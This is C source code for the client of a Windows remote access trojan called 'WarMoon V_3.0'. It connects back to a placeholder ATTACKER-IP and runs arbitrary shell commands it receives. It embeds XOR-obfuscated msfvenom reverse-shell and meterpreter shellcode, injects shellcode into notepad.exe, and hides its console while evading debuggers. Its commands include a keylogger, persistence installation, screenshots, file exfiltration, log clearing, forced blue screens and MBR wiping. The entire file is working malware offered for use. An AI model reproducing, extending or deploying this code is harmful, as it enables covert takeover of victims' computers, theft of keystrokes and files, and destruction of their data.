#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <wininet.h>
#include <windowsx.h>
#include <shellapi.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "Headers/Variables.h"
#include "Headers/BSOD.h"
#include "Headers/Clean.h"
#include "Headers/Download.h"
#include "Headers/Drives.h"
#include "Headers/IsAdmin.h"
#include "Headers/Keylogger.h"
#include "Headers/Persistence.h"
#include "Headers/TransferFiles.h"
#include "Headers/CheckVM.h"
#include "Headers/Wipe.h"

int sock;
struct sockaddr_in ServerAddress;
char *ServerIP = "ATTACKER-IP"; //CHANGE THIS!
unsigned short ServerPort = 50000;

int UseFallBackShell = 0; //Disabled by default (Uses TCP), and with multiple clients may create problems. If you want the client to start a fallback shell, set this to 1 (The server currently won't have to listen using 'nc -lvnp 38524')

struct sockaddr_in FileServerAddress;
unsigned short ServerTransferPort = 49500;

unsigned short int PersistenceTechniques[5] = {0, 0, 0, 0, 0};
int RemovedPersistences = 0;
unsigned short int KeysNotDeleted = 0;

char Site[30] = "X";

char BaseFileName[] = "IMG_"; //Base
char FullFileName[50]; //Will store the entire full name: BaseFileName + UnixTime + Extension
char Extension[] = ".bmp"; //Extension

BOOL IsKeyLoggerOn = 0;
HANDLE KeyLoggerThread;
BOOL IsShiftPressed;
FILE *fp = NULL;

char XORKey = 'P';

//msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER-IP LPORT=4444 --platform windows -a x86 -f c -v ShellcodeX86

//msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f c -v ShellcodeSpawnNetcat

//msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=38524 -f c -v FallBackShell

unsigned char ShellcodeX86[] = 
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b"
"\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01"
"\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b"
"\x48\x18\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34"
"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x05\x68\x02\x00"
"\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74"
"\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
"\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e"
"\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a"
"\x00\x53\xff\xd5";

unsigned char ShellcodeSpawnNetcat[] =
"\xb7\xa3\xc9\x4b\x4b\x4b\x2b\xc2\xae\x7a\x8b\x2f\xc0\x1b\x7b\xc0\x19\x47\xc0\x19\x5f\xc0\x39\x63\x44\xfc\x01\x6d\x7a\xb4\xe7\x77\x2a\x37\x49\x67\x6b\x8a\x84\x46\x4a\x8c\xa9\xb9\x19\x1c\xc0\x19\x5b\xc0\x01\x77\xc0\x07\x5a\x33\xa8\x03\x4a\x9a\x1a\xc0\x12\x6b\x4a\x98\xc0\x02\x53\xa8\x71\x02\xc0\x7f\xc0\x4a\x9d\x7a\xb4\xe7\x8a\x84\x46\x4a\x8c\x73\xab\x3e\xbd\x48\x36\xb3\x70\x36\x6f\x3e\xaf\x13\xc0\x13\x6f\x4a\x98\x2d\xc0\x47\x00\xc0\x13\x57\x4a\x98\xc0\x4f\xc0\x4a\x9b\xc2\x0f\x6f\x6f\x10\x10\x2a\x12\x11\x1a\xb4\xab\x14\x14\x11\xc0\x59\xa0\xc6\x16\x23\x78\x79\x4b\x4b\x23\x3c\x38\x79\x14\x1f\x23\x07\x3c\x6d\x4c\xb4\x9e\xf3\xdb\x4a\x4b\x4b\x62\x8f\x1f\x1b\x23\x62\xcb\x20\x4b\xb4\x9e\x1b\x1b\x1b\x1b\x0b\x1b\x0b\x1b\x23\xa1\x44\x94\xab\xb4\x9e\xdc\x21\x4e\x23\x8b\xe3\x4a\x4e\x23\x49\x4b\x4a\xf0\xc2\xad\x21\x5b\x1d\x1c\x23\xd2\xee\x3f\x2a\xb4\x9e\xce\x8b\x3f\x47\xb4\x05\x43\x3e\xa7\x23\xbb\xfe\xe9\x1d\xb4\x9e\x23\x28\x26\x2f\x4b\xc2\xa8\x1c\x1c\x1c\x7a\xbd\x21\x59\x12\x1d\xa9\xb6\x2d\x8c\x0f\x6f\x77\x4a\x4a\xc6\x0f\x6f\x5b\x8d\x4b\x0f\x1f\x1b\x1d\x1d\x1d\x0d\x1d\x05\x1d\x1d\x18\x1d\x23\x32\x87\x74\xcd\xb4\x9e\xc2\xab\x05\x1d\x0d\xb4\x7b\x23\x43\xcc\x56\x2b\xb4\x9e\xf0\xbb\xfe\xe9\x1d\x23\xed\xde\xf6\xd6\xb4\x9e\x77\x4d\x37\x41\xcb\xb0\xab\x3e\x4e\xf0\x0c\x58\x39\x24\x21\x4b\x18\xb4\x9e";

unsigned char FallBackShell[] =
"\xb7\xa3\xc9\x4b\x4b\x4b\x2b\xc2\xae\x7a\x8b\x2f\xc0\x1b\x7b\xc0\x19\x47\xc0\x19\x5f\xc0\x39\x63\x44\xfc\x01\x6d\x7a\xb4\xe7\x77\x2a\x37\x49\x67\x6b\x8a\x84\x46\x4a\x8c\xa9\xb9\x19\x1c\xc0\x19\x5b\xc0\x01\x77\xc0\x07\x5a\x33\xa8\x03\x4a\x9a\x1a\xc0\x12\x6b\x4a\x98\xc0\x02\x53\xa8\x71\x02\xc0\x7f\xc0\x4a\x9d\x7a\xb4\xe7\x8a\x84\x46\x4a\x8c\x73\xab\x3e\xbd\x48\x36\xb3\x70\x36\x6f\x3e\xaf\x13\xc0\x13\x6f\x4a\x98\x2d\xc0\x47\x00\xc0\x13\x57\x4a\x98\xc0\x4f\xc0\x4a\x9b\xc2\x0f\x6f\x6f\x10\x10\x2a\x12\x11\x1a\xb4\xab\x14\x14\x11\xc0\x59\xa0\xc6\x16\x23\x78\x79\x4b\x4b\x23\x3c\x38\x79\x14\x1f\x23\x07\x3c\x6d\x4c\xb4\x9e\xf3\xdb\x4a\x4b\x4b\x62\x8f\x1f\x1b\x23\x62\xcb\x20\x4b\xb4\x9e\x1b\x1b\x1b\x1b\x0b\x1b\x0b\x1b\x23\xa1\x44\x94\xab\xb4\x9e\xdc\x21\x4e\x23\x8b\xe3\x4a\x4e\x23\x49\x4b\xdd\x37\xc2\xad\x21\x5b\x1d\x1c\x23\xd2\xee\x3f\x2a\xb4\x9e\xce\x8b\x3f\x47\xb4\x05\x43\x3e\xa7\x23\xbb\xfe\xe9\x1d\xb4\x9e\x23\x28\x26\x2f\x4b\xc2\xa8\x1c\x1c\x1c\x7a\xbd\x21\x59\x12\x1d\xa9\xb6\x2d\x8c\x0f\x6f\x77\x4a\x4a\xc6\x0f\x6f\x5b\x8d\x4b\x0f\x1f\x1b\x1d\x1d\x1d\x0d\x1d\x05\x1d\x1d\x18\x1d\x23\x32\x87\x74\xcd\xb4\x9e\xc2\xab\x05\x1d\x0d\xb4\x7b\x23\x43\xcc\x56\x2b\xb4\x9e\xf0\xbb\xfe\xe9\x1d\x23\xed\xde\xf6\xd6\xb4\x9e\x77\x4d\x37\x41\xcb\xb0\xab\x3e\x4e\xf0\x0c\x58\x39\x24\x21\x4b\x18\xb4\x9e";

unsigned int GetUnixTime() //Now each screenshot that will be taken and transfered will have a unique name (Avoids overwriting older screenshots taken in the past).
{
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);
	return GetTime;
}

char *str_cut(char str[], int slice_from, int slice_to)
{
	if (str[0] == '\0')
	{
		return NULL;
	}

	char *Buffer;
	size_t StrLen, BufferLen;

	if (slice_to < 0 && slice_from > slice_to)
	{
		StrLen = strlen(str);
		if (abs(slice_to) > StrLen -1)
		{
			return NULL;
		}

		if (abs(slice_from) > StrLen)
		{
			slice_from = (-1) * StrLen;
		}

		BufferLen = slice_to - slice_from;
		str += (StrLen + slice_from);
	}
	else if (slice_from >= 0 && slice_to > slice_from)
	{
		StrLen = strlen(str);

		if (slice_from > StrLen -1)
		{
			return NULL;
		}

		BufferLen = slice_to - slice_from;
		str += slice_from;
	}

	else
	{
		return NULL;
	}

	Buffer = calloc(BufferLen, sizeof(char));
	strncpy(Buffer, str, BufferLen);
	return Buffer;
}

int Inject86()
{
	BOOL CreateProc = 0;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD GetPID = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD ThreadID = NULL;
	LPVOID MemoryBuffer = NULL;

	CreateProc = CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

	if (CreateProc == 0)
	{
		return EXIT_FAILURE;
	}

	GetPID = pi.dwProcessId;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPID);

	if (hProcess == NULL)
	{
		return EXIT_FAILURE;
	}

	MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ShellcodeX86), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (MemoryBuffer == NULL)
	{
		return EXIT_FAILURE;
	}

	BOOL isDone = WriteProcessMemory(hProcess, MemoryBuffer, ShellcodeX86, sizeof(ShellcodeX86), NULL);

	if (isDone == 0)
	{
		return EXIT_FAILURE;
	}

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MemoryBuffer, NULL, 0, 0, ThreadID);

	if (hThread == NULL)
	{
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return EXIT_SUCCESS;
}

int SpawnNetcatShell()
{
	int i = 0;

	for (i; i < sizeof(ShellcodeSpawnNetcat) - 1; i++)
	{
		ShellcodeSpawnNetcat[i] = ShellcodeSpawnNetcat[i]^XORKey;
	}

	void *execNC = VirtualAlloc(0, sizeof ShellcodeSpawnNetcat, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(execNC, ShellcodeSpawnNetcat, sizeof ShellcodeSpawnNetcat);
	((void(*)())execNC)();
	return EXIT_SUCCESS;
}

int FallBackConnection()
{
	int i = 0;

	for (i; i < sizeof(FallBackShell) - 1; i++)
	{
		FallBackShell[i] = FallBackShell[i]^XORKey;
	}

	void *exec = VirtualAlloc(0, sizeof FallBackShell, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, FallBackShell, sizeof FallBackShell);
	((void(*)())exec)();
	return EXIT_SUCCESS;
}

void PopupMSGBox()
{
	MessageBoxW(NULL, L"WarMoon Client Active!", L"WarMoon V_3.0", MB_OK);
}

void Run()
{
	char ReceiveBuffer[1024];
	char ContainerBuffer[1024];
	char TotalResponseBuffer[18384];

	while (1)
	{
		redo:
		memset(&ReceiveBuffer, 0, sizeof(ReceiveBuffer));
		memset(&ContainerBuffer, 0, sizeof(ContainerBuffer));
		memset(&TotalResponseBuffer, 0, sizeof(TotalResponseBuffer));
		recv(sock, ReceiveBuffer, 1024, 0);

		if (strncmp(ReceiveBuffer, "q", 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}

		else if (strncmp(ReceiveBuffer, "startlogger", 11) == 0)
		{
			if (IsKeyLoggerOn == 1)
			{
				char AlreadyOn[] = "\033[1;31m[-] Logger Already On!\033[0m\n";
				send(sock, AlreadyOn, sizeof(AlreadyOn), 0);
				goto redo;
			}
			KeyLoggerThread = CreateThread(NULL, 0, StartLogger, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "stoplogger", 10) == 0)
		{
			if (IsKeyLoggerOn == 0)
			{
				char AlreadyOff[] = "\033[1;31m[-] Logger Already Off!\033[0m\n";
				send(sock, AlreadyOff, sizeof(AlreadyOff), 0);
				goto redo;
			}

			StopLogger();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cd ", 3) == 0)
		{
			chdir(str_cut(ReceiveBuffer,3,100));
		}

		else if (strncmp(ReceiveBuffer, "persistence1", 12) == 0)
		{
			MaintainPersistence1();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence2", 12) == 0)
		{
			MaintainPersistence2();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence3", 12) == 0)
		{
			MaintainPersistence3();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "removepers", 10) == 0)
		{
			RemovePersistences();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isvm", 4) == 0)
		{
			IsVM();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "wipembr", 7) == 0)
		{
			WipeMBR();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanlogs", 9) == 0)
		{
			CleanLogsAPI();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "inject86", 8) == 0)
		{
				HANDLE ThreadAIOx86 = CreateThread(NULL, 0, Inject86, NULL, 0, NULL);
				goto redo;
		}

		else if (strncmp(ReceiveBuffer, "startcat", 8) == 0)
		{
				HANDLE ThreadNetCat = CreateThread(NULL, 0, SpawnNetcatShell, NULL, 0, NULL);
				goto redo;
		}

		else if (strncmp(ReceiveBuffer, "download", 8) == 0)
		{
			char FileToDownload[30];
			memset(&FileToDownload, 0, sizeof(FileToDownload));
			sscanf(ReceiveBuffer, "%*s %s", FileToDownload);
			Download(FileToDownload);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "updateurl", 9) == 0)
		{
			const char *UpdatedURL = ReceiveBuffer + 10;
			UpdateURLDownload(UpdatedURL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "getfile", 7) == 0)
		{
			const char *TransferFile = ReceiveBuffer + 8;
			TransferFilesToServer(TransferFile);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "diskspace", 9) == 0)
		{
			DiskSpace();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanbin", 8) == 0)
		{
			CleanBins();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "drives", 6) == 0)
		{
			EnumDrives();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isadmin", 7) == 0)
		{
			IsAdmin();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "hostname", 8) == 0)
		{
			PrintComputerName();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "screenshot", 10) == 0)
		{
			unsigned int UnixTime = GetUnixTime();
			snprintf(FullFileName, sizeof(FullFileName), "%s%u%s", BaseFileName, UnixTime, Extension);
			TakeScreenshot(FullFileName);
			memset(FullFileName, 0, sizeof(FullFileName));
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "popup", 5) == 0)
		{
			HANDLE ThreadMSGBox = CreateThread(NULL, 0, PopupMSGBox, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "bsodwin", 7) == 0)
		{
			HANDLE ThreadBSOD = CreateThread(NULL, 0, BSOD, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "menu", 4) == 0)
		{
			goto redo;
		}

		else
		{
			FILE *fd;
			fd = _popen(ReceiveBuffer, "r");
			while (fgets(ContainerBuffer, 1024, fd) != NULL)
			{
				strncat(TotalResponseBuffer, ContainerBuffer, sizeof(TotalResponseBuffer) - strlen(TotalResponseBuffer) - 1);
			}
			send(sock, TotalResponseBuffer, sizeof(TotalResponseBuffer), 0);
			fclose(fd);
		}
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	HWND Hide;
	AllocConsole();
	Hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Hide, 0);

	BOOL CheckDBG = IsDebuggerPresent();
	if (CheckDBG != 0)
	{
		for (int i = 2; i < 2000; i = i + 4)
		{
			i = i - 2;
			for (int j = 1; j <= 69420; j++)
			{
				for (int k = 0; k < 5; k++)
				{
					int l = 0;
					int m = 0;
					while (l < 12)
					{
						char NiceTry1[13] = "ABCDEFGHIJKL";
						char WasteTime1[13];
						WasteTime1[l] = NiceTry1[l] ^ l % 3;
						l++;
					}

					while (m < 12)
					{
						char NiceTry2[13] = "MNOPQRSTUVWX";
						char WasteTime2[13];
						WasteTime2[m] = NiceTry2[m] ^ m % 3;
						m++;
					}
				}
			}
		}
		return 1;
	}

	WSADATA wsaData;

	if (WSAStartup(2.2, &wsaData) != 0)
	{
		return 1;
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServerAddress, 0, sizeof(ServerAddress));
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
	ServerAddress.sin_port = htons(ServerPort);

	Connect:
	while (connect(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress)) != 0)
	{
		Sleep(3);
		goto Connect;
	}

	if (UseFallBackShell != 0)
	{
		HANDLE FallBack = CreateThread(NULL, 0, FallBackConnection, NULL, 0, NULL);
	}

	Run();
}
